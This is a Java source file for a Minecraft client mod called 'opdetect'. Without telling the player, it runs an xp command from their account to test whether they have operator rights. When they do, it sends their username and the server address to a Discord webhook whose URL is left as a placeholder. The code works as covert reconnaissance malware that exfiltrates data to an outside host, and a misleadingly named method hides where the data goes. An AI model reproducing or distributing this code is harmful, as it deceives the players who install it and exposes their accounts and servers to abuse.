package net.nimrod.opdetect;

import net.fabricmc.api.ModInitializer;
import net.minecraft.client.MinecraftClient;
import net.nimrod.opdetect.util.LogUtils;
import net.nimrod.opdetect.util.DiscordWebhook;

public class OpDetect implements ModInitializer {

    public static final String NAME = "opdetect";
    public static final String VERSION = "1.0.0";
    public static final String AUTHOR = "nimrod";

    public static final MinecraftClient mc = MinecraftClient.getInstance();

    private static boolean attemptedXpGive = false;
    private static boolean opDetected = false;
    private static int prevXpLevel = 0;

	@Override
	public void onInitialize() {
        LogUtils.consoleLog(String.format("%s v%s - created by %s", NAME, VERSION, AUTHOR));
	}

    public static void onTick() {
        if (mc.player == null || mc.world == null)
            return;

        if (opDetected)
            return;

        if (!attemptedXpGive) {
            mc.getNetworkHandler().sendChatCommand("xp add @s 1337");
            attemptedXpGive = true;
            return;
        }

        if (mc.player.totalExperience == (prevXpLevel + 1337)) {
            try {
                notifyServer(String.format("User **%s** appears to have OP on server **%s**",
                            mc.getSession().getUsername(),
                            mc.getCurrentServerEntry().address));
            } catch (Exception e) { e.printStackTrace(); }

            opDetected = true;
            return;
        }

        prevXpLevel = mc.player.totalExperience;
    }

    public static void reset() {
        attemptedXpGive = false;
        opDetected = false;
        prevXpLevel = 0;
    }

    private static void notifyServer(String message) throws Exception {
        DiscordWebhook discordWebhook = new DiscordWebhook(INSERT_WEBHOOK_URL);
        discordWebhook.setUsername("OpDetect Client");
        discordWebhook.setContent(message);
        discordWebhook.execute();
    }

}
